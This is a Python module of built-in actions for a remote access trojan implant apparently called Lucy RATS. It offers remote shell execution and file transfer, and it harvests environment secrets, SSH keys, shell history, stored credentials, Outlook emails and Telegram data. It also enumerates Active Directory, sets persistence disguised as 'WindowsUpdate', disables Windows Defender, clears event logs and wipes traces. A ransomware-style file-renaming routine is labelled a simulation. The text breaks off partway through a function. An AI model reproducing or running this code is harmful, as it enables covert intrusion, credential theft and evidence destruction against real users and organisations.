"""
Built-in agent modules — no external dependencies required.
Each module exposes: run(action: str, params: dict) -> dict
"""
import base64
import hashlib
import io
import os
import platform
import subprocess
import sys
import threading
import time


# ---------------------------------------------------------------------------
# Base
# ---------------------------------------------------------------------------


class ModuleError(Exception):
    pass


def _result(data=None, error=None, status="completed") -> dict:
    return {"status": status, "data": data, "error": error}


# ---------------------------------------------------------------------------
# Module: shell
# ---------------------------------------------------------------------------


def shell_run(action: str, params: dict) -> dict:
    """
    Execute a shell command and return stdout/stderr.
    params: {cmd: str, timeout: int (default 30)}
    """
    cmd = params.get("cmd", "")
    timeout = int(params.get("timeout", 30))

    if not cmd:
        return _result(error="No command provided", status="failed")

    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return _result(data={
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode,
        })
    except subprocess.TimeoutExpired:
        return _result(error=f"Command timed out after {timeout}s", status="failed")
    except Exception as exc:
        return _result(error=str(exc), status="failed")


# ---------------------------------------------------------------------------
# Module: file
# ---------------------------------------------------------------------------


def file_run(action: str, params: dict) -> dict:
    """
    File operations.
    Actions: read, write, list, delete, upload (receive b64), download (send b64), stat
    """
    path = params.get("path", "")

    if action == "list":
        try:
            entries = []
            for name in os.listdir(path or "."):
                full = os.path.join(path or ".", name)
                try:
                    stat = os.stat(full)
                    entries.append({
                        "name": name,
                        "path": full,
                        "size": stat.st_size,
                        "is_dir": os.path.isdir(full),
                        "modified": stat.st_mtime,
                    })
                except OSError:
                    entries.append({"name": name, "path": full, "error": "stat failed"})
            return _result(data={"entries": entries, "path": path or "."})
        except Exception as exc:
            return _result(error=str(exc), status="failed")

    elif action == "read":
        try:
            with open(path, "rb") as f:
                content = f.read()
            sha256 = hashlib.sha256(content).hexdigest()
            return _result(data={
                "path": path,
                "content_b64": base64.b64encode(content).decode(),
                "size": len(content),
                "sha256": sha256,
            })
        except Exception as exc:
            return _result(error=str(exc), status="failed")

    elif action == "write":
        content_b64 = params.get("content_b64", "")
        try:
            content = base64.b64decode(content_b64)
            with open(path, "wb") as f:
                f.write(content)
            return _result(data={"path": path, "size": len(content), "written": True})
        except Exception as exc:
            return _result(error=str(exc), status="failed")

    elif action == "delete":
        try:
            os.remove(path)
            return _result(data={"path": path, "deleted": True})
        except Exception as exc:
            return _result(error=str(exc), status="failed")

    elif action == "stat":
        try:
            stat = os.stat(path)
            return _result(data={
                "path": path,
                "size": stat.st_size,
                "modified": stat.st_mtime,
                "is_dir": os.path.isdir(path),
                "is_file": os.path.isfile(path),
            })
        except Exception as exc:
            return _result(error=str(exc), status="failed")

    elif action == "tree":
        try:
            tree = []
            max_depth = int(params.get("depth", 3))

            def _walk(base, depth):
                if depth > max_depth:
                    return
                try:
                    for name in os.listdir(base):
                        full = os.path.join(base, name)
                        is_dir = os.path.isdir(full)
                        tree.append({"path": full, "is_dir": is_dir, "depth": depth})
                        if is_dir:
                            _walk(full, depth + 1)
                except PermissionError:
                    pass

            _walk(path or ".", 0)
            return _result(data={"tree": tree, "root": path or "."})
        except Exception as exc:
            return _result(error=str(exc), status="failed")

    return _result(error=f"Unknown file action: {action}", status="failed")


# ---------------------------------------------------------------------------
# Module: info
# ---------------------------------------------------------------------------


def info_run(action: str, params: dict) -> dict:
    """
    System information collection.
    Actions: run (full info), processes, network, env
    """
    if action in ("run", "full", "collect"):
        return _result(data=_collect_system_info())

    elif action == "processes":
        return _result(data={"processes": _list_processes()})

    elif action == "network":
        return _result(data={"interfaces": _network_info()})

    elif action == "env":
        return _result(data={"env": dict(os.environ)})

    return _result(error=f"Unknown info action: {action}", status="failed")


# ---------------------------------------------------------------------------
# Module: builtin — extended OS/AD/persistence/evasion actions
# ---------------------------------------------------------------------------


def builtin_run(action: str, params: dict) -> dict:
    """
    Extended built-in actions covering OS recon, AD, persistence, evasion.
    """
    try:
        if action == "sysinfo":
            return _result(data=_collect_system_info())

        elif action == "users":
            return _result(data={"users": _get_local_users()})

        elif action == "groups":
            return _result(data={"groups": _get_local_groups()})

        elif action == "processes":
            return _result(data={"processes": _list_processes()})

        elif action == "services":
            return _result(data={"services": _get_services()})

        elif action == "netinfo":
            return _result(data={"interfaces": _network_info()})

        elif action == "netstat":
            return _result(data={"connections": _netstat()})

        elif action == "arp":
            return _result(data={"arp": _arp_table()})

        elif action == "routes":
            return _result(data={"routes": _routing_table()})

        elif action == "shares":
            return _result(data={"shares": _get_shares()})

        elif action == "installed":
            return _result(data={"installed": _get_installed()})

        elif action == "startup":
            return _result(data={"startup": _get_startup()})

        elif action == "disks":
            return _result(data={"disks": _get_disks()})

        elif action == "env_secrets":
            patterns = params.get("patterns", ["TOKEN", "SECRET", "PASSWORD", "API_KEY", "AWS", "AZURE", "GCP"])
            return _result(data={"secrets": _find_env_secrets(patterns)})

        elif action == "ssh_keys":
            return _result(data={"keys": _find_ssh_keys()})

        elif action == "shell_history":
            return _result(data={"history": _get_shell_history()})

        elif action == "credential_manager":
            return _result(data={"credentials": _get_credential_manager()})

        elif action == "persist":
            return _result(data=_persist(params))

        elif action in ("hide", "attrib_hidden"):
            return _result(data=_hide_file(params))

        elif action == "disable_defender":
            return _result(data=_disable_defender())

        elif action == "firewall_rule":
            return _result(data=_add_firewall_rule(params))

        elif action == "clear_logs":
            return _result(data=_clear_event_logs(params))

        elif action in ("clear_history", "wipe_traces"):
            return _result(data=_wipe_traces(params))

        elif action == "shadow_copies":
            return _result(data=_enumerate_shadow_copies())

        elif action == "backups_enum":
            return _result(data=_enumerate_backups())

        elif action == "simulate_ransom":
            return _result(data=_simulate_ransom(params))

        elif action == "domain_users":
            return _result(data={"users": _get_domain_users()})

        elif action == "domain_admins":
            return _result(data={"admins": _get_domain_admins()})

        elif action == "domain_computers":
            return _result(data={"computers": _get_domain_computers()})

        elif action == "trust_domains":
            return _result(data={"trusts": _get_trust_domains()})

        elif action == "sessions":
            return _result(data={"sessions": _get_active_sessions()})

        elif action == "dns_enum":
            domain = params.get("domain", "local")
            return _result(data={"records": _dns_enum(domain)})

        elif action == "recent_files":
            limit = int(params.get("limit", 50))
            return _result(data={"files": _get_recent_files(limit)})

        elif action == "outlook_emails":
            return _result(data=_get_outlook_emails(params))

        elif action == "telegram_data":
            return _result(data={"data": _get_telegram_data()})

        elif action == "proxy_settings":
            return _result(data={"proxy": _get_proxy_settings()})

        elif action == "startup":
            return _result(data={"startup": _get_startup()})

        else:
            return _result(error=f"Unknown builtin action: {action}", status="failed")

    except Exception as exc:
        return _result(error=f"builtin:{action} crashed: {exc}", status="failed")


# --- OS Recon helpers -------------------------------------------------------

def _get_local_users() -> list:
    users = []
    try:
        if platform.system() == "Windows":
            out = subprocess.check_output(
                ["net", "user"], text=True, timeout=10, errors="replace",
                stderr=subprocess.DEVNULL
            )
            for line in out.splitlines()[4:-2]:
                for u in line.split():
                    if u and u != "command":
                        users.append(u)
        else:
            with open("/etc/passwd") as f:
                for line in f:
                    parts = line.strip().split(":")
                    if parts and int(parts[2]) >= 1000 or parts[0] == "root":
                        users.append({"name": parts[0], "uid": parts[2], "home": parts[5]})
    except Exception as exc:
        users.append({"error": str(exc)})
    return users


def _get_local_groups() -> list:
    groups = []
    try:
        if platform.system() == "Windows":
            out = subprocess.check_output(
                ["net", "localgroup"], text=True, timeout=10, errors="replace",
                stderr=subprocess.DEVNULL
            )
            for line in out.splitlines():
                if line.startswith("*"):
                    groups.append(line[1:].strip())
        else:
            with open("/etc/group") as f:
                for line in f:
                    parts = line.strip().split(":")
                    if parts:
                        groups.append({"name": parts[0], "gid": parts[2]})
    except Exception as exc:
        groups.append({"error": str(exc)})
    return groups


def _get_services() -> list:
    services = []
    try:
        if platform.system() == "Windows":
            out = subprocess.check_output(
                ["sc", "query", "type=", "all", "state=", "all"],
                text=True, timeout=15, errors="replace", stderr=subprocess.DEVNULL
            )
            current = {}
            for line in out.splitlines():
                line = line.strip()
                if line.startswith("SERVICE_NAME:"):
                    if current:
                        services.append(current)
                    current = {"name": line.split(":", 1)[1].strip()}
                elif line.startswith("STATE") and current:
                    current["state"] = line.split(":", 1)[1].strip()
            if current:
                services.append(current)
        else:
            out = subprocess.check_output(
                ["systemctl", "list-units", "--type=service", "--no-pager", "-l"],
                text=True, timeout=10, errors="replace", stderr=subprocess.DEVNULL
            )
            for line in out.splitlines()[1:]:
                parts = line.split(None, 4)
                if len(parts) >= 4:
                    services.append({"name": parts[0], "state": parts[3]})
    except Exception as exc:
        services.append({"error": str(exc)})
    return services


def _netstat() -> list:
    connections = []
    try:
        import psutil
        for c in psutil.net_connections(kind="inet"):
            connections.append({
                "proto": "tcp" if c.type.name == "SOCK_STREAM" else "udp",
                "local": f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else "",
                "remote": f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else "",
                "status": c.status,
                "pid": c.pid,
            })
        return connections
    except Exception:
        pass
    try:
        cmd = "netstat -ano" if platform.system() == "Windows" else "netstat -tulnp"
        out = subprocess.check_output(cmd, shell=True, text=True, timeout=10, errors="replace")
        for line in out.splitlines()[2:]:
            parts = line.split()
            if len(parts) >= 4:
                connections.append({"raw": line.strip()})
    except Exception as exc:
        connections.append({"error": str(exc)})
    return connections


def _arp_table() -> list:
    arp = []
    try:
        out = subprocess.check_output(
            ["arp", "-a"], text=True, timeout=10, errors="replace", stderr=subprocess.DEVNULL
        )
        for line in out.splitlines():
            parts = line.split()
            if len(parts) >= 2 and ("." in parts[0] or ":" in parts[0]):
                arp.append({"ip": parts[0], "mac": parts[1] if len(parts) > 1 else ""})
    except Exception as exc:
        arp.append({"error": str(exc)})
    return arp


def _routing_table() -> list:
    routes = []
    try:
        if platform.system() == "Windows":
            out = subprocess.check_output(
                ["route", "print"], text=True, timeout=10, errors="replace", stderr=subprocess.DEVNULL
            )
        else:
            out = subprocess.check_output(
                ["ip", "route"], text=True, timeout=10, errors="replace", stderr=subprocess.DEVNULL
            )
        for line in out.splitlines():
            if line.strip():
                routes.append({"raw": line.strip()})
    except Exception as exc:
        routes.append({"error": str(exc)})
    return routes


def _get_shares() -> list:
    shares = []
    try:
        if platform.system() == "Windows":
            out = subprocess.check_output(
                ["net", "share"], text=True, timeout=10, errors="replace", stderr=subprocess.DEVNULL
            )
            for line in out.splitlines()[3:]:
                parts = line.split(None, 2)
                if len(parts) >= 2 and parts[0] not in ("Share", "name", "-"):
                    shares.append({"name": parts[0], "path": parts[1] if len(parts) > 1 else ""})
        else:
            out = subprocess.check_output(
                ["cat", "/etc/exports"], text=True, timeout=5, errors="replace"
            )
            for line in out.splitlines():
                if line.strip() and not line.startswith("#"):
                    shares.append({"export": line.strip()})
    except Exception as exc:
        shares.append({"error": str(exc)})
    return shares


def _get_installed() -> list:
    installed = []
    try:
        if platform.system() == "Windows":
            import winreg
            for hive in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
                for path in [
                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                    r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
                ]:
                    try:
                        key = winreg.OpenKey(hive, path)
                        for i in range(winreg.QueryInfoKey(key)[0]):
                            try:
                                sub = winreg.OpenKey(key, winreg.EnumKey(key, i))
                                name = winreg.QueryValueEx(sub, "DisplayName")[0]
                                version = ""
                                try:
                                    version = winreg.QueryValueEx(sub, "DisplayVersion")[0]
                                except Exception:
                                    pass
                                installed.append({"name": name, "version": version})
                            except Exception:
                                pass
                    except Exception:
                        pass
        else:
            for cmd in [["dpkg", "-l"], ["rpm", "-qa", "--qf", "%{NAME}\\n"]]:
                try:
                    out = subprocess.check_output(cmd, text=True, timeout=15, errors="replace")
                    for line in out.splitlines()[:200]:
                        installed.append({"raw": line.strip()})
                    break
                except Exception:
                    pass
    except Exception as exc:
        installed.append({"error": str(exc)})
    return installed


def _get_startup() -> list:
    startup = []
    try:
        if platform.system() == "Windows":
            import winreg
            run_keys = [
                (winreg.HKEY_CURRENT_USER,  r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"),
            ]
            for hive, path in run_keys:
                try:
                    key = winreg.OpenKey(hive, path)
                    for i in range(winreg.QueryInfoKey(key)[1]):
                        name, value, _ = winreg.EnumValue(key, i)
                        startup.append({"name": name, "command": value, "hive": str(hive)})
                except Exception:
                    pass
            home = os.path.expanduser("~")
            startup_dirs = [
                os.path.join(home, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup"),
                r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp",
            ]
            for d in startup_dirs:
                if os.path.isdir(d):
                    for f in os.listdir(d):
                        startup.append({"name": f, "path": os.path.join(d, f), "type": "startup_folder"})
        else:
            for path in ["/etc/rc.local", "/etc/crontab"]:
                try:
                    content = open(path).read()
                    startup.append({"file": path, "content": content[:500]})
                except Exception:
                    pass
    except Exception as exc:
        startup.append({"error": str(exc)})
    return startup


def _get_disks() -> list:
    disks = []
    try:
        import psutil
        for p in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(p.mountpoint)
                disks.append({
                    "device": p.device, "mountpoint": p.mountpoint,
                    "fstype": p.fstype,
                    "total_gb": round(usage.total / 1e9, 2),
                    "free_gb": round(usage.free / 1e9, 2),
                    "used_pct": usage.percent,
                })
            except Exception:
                disks.append({"device": p.device, "mountpoint": p.mountpoint})
        return disks
    except Exception:
        pass
    try:
        if platform.system() == "Windows":
            out = subprocess.check_output(
                ["wmic", "logicaldisk", "get", "caption,size,freespace"],
                text=True, timeout=10, errors="replace"
            )
            for line in out.splitlines()[1:]:
                parts = line.split()
                if parts:
                    disks.append({"raw": line.strip()})
        else:
            out = subprocess.check_output(
                ["df", "-h"], text=True, timeout=10, errors="replace"
            )
            for line in out.splitlines()[1:]:
                disks.append({"raw": line.strip()})
    except Exception as exc:
        disks.append({"error": str(exc)})
    return disks


def _find_env_secrets(patterns: list) -> list:
    secrets = []
    for k, v in os.environ.items():
        if any(p.upper() in k.upper() for p in patterns):
            secrets.append({"key": k, "value": v[:200]})
    return secrets


def _find_ssh_keys() -> list:
    keys = []
    home = os.path.expanduser("~")
    ssh_dir = os.path.join(home, ".ssh")
    key_files = ["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa", "id_rsa.pub",
                 "id_ed25519.pub", "authorized_keys", "known_hosts", "config"]
    if os.path.isdir(ssh_dir):
        for f in os.listdir(ssh_dir):
            fpath = os.path.join(ssh_dir, f)
            try:
                content = open(fpath, errors="replace").read(4096)
                keys.append({"file": fpath, "preview": content[:200]})
            except Exception:
                keys.append({"file": fpath, "error": "unreadable"})
    return keys


def _get_shell_history() -> list:
    history = []
    home = os.path.expanduser("~")
    hist_files = [
        os.path.join(home, ".bash_history"),
        os.path.join(home, ".zsh_history"),
        os.path.join(home, ".fish_history"),
        os.path.join(home, "AppData", "Roaming", "Microsoft", "Windows", "PowerShell",
                     "PSReadLine", "ConsoleHost_history.txt"),
    ]
    for f in hist_files:
        if os.path.isfile(f):
            try:
                lines = open(f, errors="replace").readlines()[-200:]
                history.append({"file": f, "lines": [l.strip() for l in lines if l.strip()]})
            except Exception:
                history.append({"file": f, "error": "unreadable"})
    return history


def _get_credential_manager() -> list:
    creds = []
    if platform.system() != "Windows":
        return creds
    try:
        out = subprocess.check_output(
            ["cmdkey", "/list"], text=True, timeout=10, errors="replace", stderr=subprocess.DEVNULL
        )
        current: dict = {}
        for line in out.splitlines():
            line = line.strip()
            if line.startswith("Target:"):
                if current:
                    creds.append(current)
                current = {"target": line.split(":", 1)[1].strip()}
            elif line.startswith("User:") and current:
                current["user"] = line.split(":", 1)[1].strip()
            elif line.startswith("Type:") and current:
                current["type"] = line.split(":", 1)[1].strip()
        if current:
            creds.append(current)
    except Exception as exc:
        creds.append({"error": str(exc)})
    return creds


# --- Persistence / Evasion helpers ------------------------------------------

def _persist(params: dict) -> dict:
    method = params.get("method", "registry")
    if platform.system() != "Windows" and method in ("registry", "scheduled_task", "startup_folder"):
        return {"status": "skipped", "reason": "Windows only"}

    exe_path = sys.executable
    name = params.get("name", params.get("key", "WindowsUpdate"))

    try:
        if method == "registry":
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            return {"status": "ok", "method": method, "key": name, "path": exe_path}

        elif method == "scheduled_task":
            interval = params.get("interval", "daily")
            schedule_map = {"hourly": "HOURLY", "daily": "DAILY", "weekly": "WEEKLY"}
            sched = schedule_map.get(interval, "DAILY")
            subprocess.run([
                "schtasks", "/create", "/f",
                "/tn", name,
                "/sc", sched,
                "/tr", exe_path,
            ], check=True, timeout=15, capture_output=True)
            return {"status": "ok", "method": method, "task": name, "schedule": sched}

        elif method == "startup_folder":
            startup = os.path.join(
                os.environ.get("APPDATA", ""),
                "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
            )
            import shutil
            dst = os.path.join(startup, os.path.basename(exe_path))
            shutil.copy2(exe_path, dst)
            return {"status": "ok", "method": method, "path": dst}

        else:
            return {"status": "skipped", "reason": f"Unknown method: {method}"}

    except Exception as exc:
        return {"status": "error", "error": str(exc)}


def _hide_file(params: dict) -> dict:
    path = params.get("path", sys.executable)
    try:
        if platform.system() == "Windows":
            subprocess.run(["attrib", "+H", "+S", path], timeout=5, capture_output=True)
            return {"status": "ok", "hidden": path}
        else:
            return {"status": "skipped", "reason": "Linux: use dot-prefix naming"}
    except Exception as exc:
        return {"status": "error", "error": str(exc)}


def _disable_defender() -> dict:
    if platform.system() != "Windows":
        return {"status": "skipped", "reason": "Windows only"}
    try:
        cmds = [
            ["powershell", "-Command",
             "Set-MpPreference -DisableRealtimeMonitoring $true"],
            ["powershell", "-Command",
             "Set-MpPreference -DisableIOAVProtection $true"],
        ]
        results = []
        for cmd in cmds:
            r = subprocess.run(cmd, capture_output=True, timeout=15, text=True)
            results.append({"cmd": " ".join(cmd[2:]), "rc": r.returncode})
        return {"status": "ok", "actions": results}
    except Exception as exc:
        return {"status": "error", "error": str(exc)}


def _add_firewall_rule(params: dict) -> dict:
    if platform.system() != "Windows":
        return {"status": "skipped", "reason": "Windows only"}
    name = params.get("name", "LucyRule")
    port = params.get("port", 443)
    action_fw = params.get("action", "allow")
    try:
        subprocess.run([
            "netsh", "advfirewall", "firewall", "add", "rule",
            f"name={name}", "dir=out", f"action={action_fw}",
            "protocol=TCP", f"remoteport={port}",
        ], capture_output=True, timeout=15)
        return {"status": "ok", "name": name, "port": port}
    except Exception as exc:
        return {"status": "error", "error": str(exc)}


def _clear_event_logs(params: dict) -> dict:
    logs = params.get("logs", ["Security", "System", "Application"])
    results = []
    if platform.system() == "Windows":
        for log in logs:
            try:
                r = subprocess.run(
                    ["wevtutil", "cl", log],
                    capture_output=True, timeout=15, text=True
                )
                results.append({"log": log, "rc": r.returncode})
            except Exception as exc:
                results.append({"log": log, "error": str(exc)})
    else:
        for log in ["/var/log/auth.log", "/var/log/syslog", "/var/log/messages"]:
            try:
                open(log, "w").close()
                results.append({"log": log, "cleared": True})
            except Exception as exc:
                results.append({"log": log, "error": str(exc)})
    return {"status": "ok", "results": results}


def _wipe_traces(params: dict) -> dict:
    wiped = []
    if platform.system() == "Windows":
        paths = []
        if params.get("temp", False):
            paths += [
                os.environ.get("TEMP", ""),
                os.environ.get("TMP", ""),
                os.path.join(os.environ.get("SYSTEMROOT", "C:\\Windows"), "Temp"),
            ]
        if params.get("prefetch", False):
            paths.append(os.path.join(os.environ.get("SYSTEMROOT", "C:\\Windows"), "Prefetch"))
        if params.get("thumbcache", False):
            home = os.path.expanduser("~")
            paths.append(os.path.join(home, "AppData", "Local", "Microsoft",
                                      "Windows", "Explorer"))
        for d in paths:
            if d and os.path.isdir(d):
                try:
                    for f in os.listdir(d):
                        fp = os.path.join(d, f)
                        try:
                            os.unlink(fp)
                            wiped.append(fp)
                        except Exception:
                            pass
                except Exception:
                    pass
        home = os.path.expanduser("~")
        hist_file = os.path.join(home, "AppData", "Roaming", "Microsoft", "Windows",
                                 "PowerShell", "PSReadLine", "ConsoleHost_history.txt")
        try:
            open(hist_file, "w").close()
            wiped.append(hist_file)
        except Exception:
            pass
    else:
        for f in [
            os.path.expanduser("~/.bash_history"),
            os.path.expanduser("~/.zsh_history"),
        ]:
            try:
                open(f, "w").close()
                wiped.append(f)
            except Exception:
                pass
    return {"status": "ok", "wiped_count": len(wiped)}


# --- AD Enumeration helpers -------------------------------------------------

def _get_domain_users() -> list:
    users = []
    try:
        if platform.system() == "Windows":
            out = subprocess.check_output(
                ["net", "user", "/domain"],
                text=True, timeout=15, errors="replace", stderr=subprocess.DEVNULL
            )
            for line in out.splitlines()[4:-3]:
                for u in line.split():
                    if u:
                        users.append(u)
        else:
            out = subprocess.check_output(
                ["getent", "passwd"], text=True, timeout=10, errors="replace"
            )
            for line in out.splitlines():
                parts = line.split(":")
                if parts:
                    users.append(parts[0])
    except Exception as exc:
        users.append({"error": str(exc)})
    return users


def _get_domain_admins() -> list:
    admins = []
    try:
        if platform.system() == "Windows":
            out = subprocess.check_output(
                ["net", "group", "Domain Admins", "/domain"],
                text=True, timeout=15, errors="replace", stderr=subprocess.DEVNULL
            )
            for line in out.splitlines()[6:-3]:
                for u in line.split():
                    if u:
                        admins.append(u)
        else:
            out = subprocess.check_output(
                ["getent", "group", "sudo"],
                text=True, timeout=5, errors="replace"
            )
            parts = out.strip().split(":")
            if len(parts) >= 4:
                admins = parts[3].split(",")
    except Exception as exc:
        admins.append({"error": str(exc)})
    return admins


def _get_domain_computers() -> list:
    computers = []
    try:
        if platform.system() == "Windows":
            out = subprocess.check_output(
                ["dsquery", "computer"],
                text=True, timeout=15, errors="replace", stderr=subprocess.DEVNULL
            )
            computers = [l.strip().strip('"') for l in out.splitlines() if l.strip()]
        else:
            out = subprocess.check_output(
                ["nmblookup", "-A", "255.255.255.255"],
                text=True, timeout=10, errors="replace", stderr=subprocess.DEVNULL
            )
            for line in out.splitlines():
                if "<00>" in line:
                    computers.append(line.split()[0])
    except Exception as exc:
        computers.append({"error": str(exc)})
    return computers


def _get_trust_domains() -> list:
    trusts = []
    try:
        if platform.system() == "Windows":
            out = subprocess.check_output(
                ["nltest", "/domain_trusts"],
                text=True, timeout=15, errors="replace", stderr=subprocess.DEVNULL
            )
            for line in out.splitlines():
                if line.strip() and line[0].isdigit():
                    trusts.append({"raw": line.strip()})
    except Exception as exc:
        trusts.append({"error": str(exc)})
    return trusts


def _get_active_sessions() -> list:
    sessions = []
    try:
        if platform.system() == "Windows":
            out = subprocess.check_output(
                ["query", "session"], text=True, timeout=10, errors="replace", stderr=subprocess.DEVNULL
            )
            for line in out.splitlines()[1:]:
                parts = line.split()
                if len(parts) >= 3:
                    sessions.append({"raw": line.strip()})
        else:
            out = subprocess.check_output(
                ["who"], text=True, timeout=5, errors="replace"
            )
            for line in out.splitlines():
                parts = line.split()
                if parts:
                    sessions.append({"user": parts[0], "tty": parts[1] if len(parts) > 1 else ""})
    except Exception as exc:
        sessions.append({"error": str(exc)})
    return sessions


def _dns_enum(domain: str) -> list:
    records = []
    record_types = ["A", "MX", "NS", "TXT", "CNAME", "SOA"]
    for rtype in record_types:
        try:
            if platform.system() == "Windows":
                out = subprocess.check_output(
                    ["nslookup", "-type=" + rtype, domain],
                    text=True, timeout=10, errors="replace", stderr=subprocess.DEVNULL
                )
            else:
                out = subprocess.check_output(
                    ["dig", "+short", domain, rtype],
                    text=True, timeout=10, errors="replace", stderr=subprocess.DEVNULL
                )
            if out.strip():
                records.append({"type": rtype, "result": out.strip()[:500]})
        except Exception:
            pass
    return records


# --- Data collection helpers ------------------------------------------------

def _get_recent_files(limit: int = 50) -> list:
    recent = []
    if platform.system() == "Windows":
        recent_dir = os.path.join(
            os.environ.get("APPDATA", ""), "Microsoft", "Windows", "Recent"
        )
        if os.path.isdir(recent_dir):
            files = []
            for f in os.listdir(recent_dir):
                fp = os.path.join(recent_dir, f)
                try:
                    files.append((os.stat(fp).st_mtime, f, fp))
                except Exception:
                    pass
            files.sort(reverse=True)
            for mtime, name, path in files[:limit]:
                recent.append({"name": name, "path": path, "modified": mtime})
    else:
        home = os.path.expanduser("~")
        try:
            out = subprocess.check_output(
                ["find", home, "-maxdepth", "4", "-type", "f",
                 "-newer", "/tmp", "-not", "-path", "*/.*"],
                text=True, timeout=15, errors="replace"
            )
            recent = [{"path": l.strip()} for l in out.splitlines()[:limit] if l.strip()]
        except Exception:
            pass
    return recent


def _get_outlook_emails(params: dict) -> dict:
    limit = int(params.get("limit", 100))
    try:
        if platform.system() != "Windows":
            return {"error": "Windows only", "emails": []}
        import win32com.client
        outlook = win32com.client.Dispatch("Outlook.Application")
        ns = outlook.GetNamespace("MAPI")
        emails = []
        inbox = ns.GetDefaultFolder(6)
        for msg in inbox.Items[:limit]:
            try:
                emails.append({
                    "subject": str(msg.Subject),
                    "sender": str(msg.SenderEmailAddress),
                    "date": str(msg.SentOn),
                    "body_preview": str(msg.Body)[:300],
                })
            except Exception:
                pass
        return {"emails": emails, "count": len(emails)}
    except Exception as exc:
        return {"error": str(exc), "emails": []}


def _get_telegram_data() -> list:
    data = []
    home = os.path.expanduser("~")
    tg_paths = [
        os.path.join(home, "AppData", "Roaming", "Telegram Desktop", "tdata"),
        os.path.join(home, ".local", "share", "TelegramDesktop", "tdata"),
    ]
    for path in tg_paths:
        if os.path.isdir(path):
            for f in os.listdir(path):
                fp = os.path.join(path, f)
                try:
                    size = os.path.getsize(fp)
                    data.append({"file": fp, "size": size})
                except Exception:
                    pass
    return data


def _get_proxy_settings() -> dict:
    proxy = {}
    try:
        if platform.system() == "Windows":
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Internet Settings"
            )
            try:
                proxy["enabled"] = winreg.QueryValueEx(key, "ProxyEnable")[0]
                proxy["server"] = winreg.QueryValueEx(key, "ProxyServer")[0]
            except Exception:
                pass
        else:
            for var in ["http_proxy", "https_proxy", "HTTP_PROXY", "HTTPS_PROXY"]:
                val = os.environ.get(var, "")
                if val:
                    proxy[var] = val
    except Exception as exc:
        proxy["error"] = str(exc)
    return proxy


# --- Ransomware simulation helpers ------------------------------------------

def _enumerate_shadow_copies() -> list:
    copies = []
    if platform.system() != "Windows":
        return [{"status": "skipped", "reason": "Windows only"}]
    try:
        out = subprocess.check_output(
            ["vssadmin", "list", "shadows"],
            text=True, timeout=20, errors="replace", stderr=subprocess.DEVNULL
        )
        for line in out.splitlines():
            if line.strip():
                copies.append({"raw": line.strip()})
    except Exception as exc:
        copies.append({"error": str(exc)})
    return copies


def _enumerate_backups() -> list:
    backups = []
    if platform.system() != "Windows":
        return [{"status": "skipped", "reason": "Windows only"}]
    try:
        out = subprocess.check_output(
            ["wbadmin", "get", "versions"],
            text=True, timeout=20, errors="replace", stderr=subprocess.DEVNULL
        )
        for line in out.splitlines():
            if line.strip():
                backups.append({"raw": line.strip()})
    except Exception as exc:
        backups.append({"error": str(exc)})
    return backups


def _simulate_ransom(params: dict) -> dict:
    """DRY RUN ONLY — no real encryption, no real damage."""
    dry_run = params.get("dry_run", True)
    marker = params.get("marker", ".LUCY_TEST")
    paths = params.get("paths", [os.path.join(os.path.expanduser("~"), "Desktop", "LUCY_RANSOM_TEST")])
    create_note = params.get("create_note", True)

    results = {"dry_run": dry_run, "marker": marker, "files_found": 0, "note_created": False}

    for p in paths:
        expanded = os.path.expanduser(p)
        if os.path.isdir(expanded):
            for f in os.listdir(expanded):
                fp = os.path.join(expanded, f)
                if os.path.isfile(fp) and not f.endswith(marker):
                    results["files_found"] += 1
                    if not dry_run:
                        try:
                            os.rename(fp, fp + marker)
                        except Exception:
                            pass

    if create_note:
        note_path = os.path.join(os.path.expanduser("~"), "Desktop", "README_LUCY_TEST.txt")
        try:
            with open(note_path, "w") as nf:
                nf.write(
                    "=== LUCY RANSOMWARE SIMULATION (TEST ONLY) ===\n"
                    "This is a simulated ransomware test by Lucy RATS.\n"
                    "NO real files were encrypted. This is an authorized security test.\n"
                    f"Marker: {marker}\n"
                )
            results["note_created"] = True
            results["note_path"] = note_path
        except Exception as exc:
            results["note_error"] = str(exc)

    return results


def _collect_system_info() -> dict:
    info: dict = {}

    info["hostname"] = platform.node()
    info["os"] = platform.system().lower()
    info["os_version"] = platform.version()
    info["os_release"] = platform.release()
    info["architecture"] = platform.machine()
    info["processor"] = platform.processor()
    info["python_version"] = sys.version

    try:
        import socket
        info["ip_private"] = socket.gethostbyname(socket.gethostname())
    except Exception:
        info["ip_private"] = "unknown"

    try:
        info["username"] = os.getlogin()
    except Exception:
        info["username"] = os.environ.get("USER") or os.environ.get("USERNAME") or "unknown"

    try:
        import psutil
        vm = psutil.virtual_memory()
        info["ram_total"] = vm.total
        info["ram_available"] = vm.available
        info["cpu_count"] = psutil.cpu_count()
        info["cpu_percent"] = psutil.cpu_percent(interval=0.5)
        disk = psutil.disk_usage("/")
        info["disk_total"] = disk.total
        info["disk_free"] = disk.free
        info["boot_time"] = psutil.boot_time()
    except ImportError:
        info.update(_ram_fallback())

    info["processes"] = _list_processes()
    info["env_vars"] = {
        k: v for k, v in os.environ.items()
        if any(x in k.upper() for x in ("PATH", "HOME", "USER", "TEMP", "APPDATA"))
    }

